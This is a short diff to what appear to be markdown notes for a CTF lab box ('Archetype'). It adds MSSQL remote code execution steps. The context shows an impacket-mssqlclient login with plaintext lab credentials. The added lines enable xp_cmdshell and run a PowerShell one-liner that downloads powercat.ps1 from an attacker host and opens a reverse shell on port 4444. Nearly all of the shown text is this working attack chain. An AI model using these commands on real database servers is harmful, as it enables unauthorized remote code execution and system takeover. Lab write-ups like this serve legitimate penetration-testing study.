@@ -41,4 +41,9 @@ cat prod.dtsConfig
 ### mssql RCE
 ```bash
 impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.68.227 -windows-auth
+
+# xp_cmdshell 활성화
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# oneline reverse shell
+EXEC xp_cmdshell 'powershell -c "IEX (New-Object System.Net.Webclient).DownloadString(\"http://192.168.000.000/powercat.ps1\");powercat -c 192.168.000.000 -p 4444 -e powershell"';
 ```
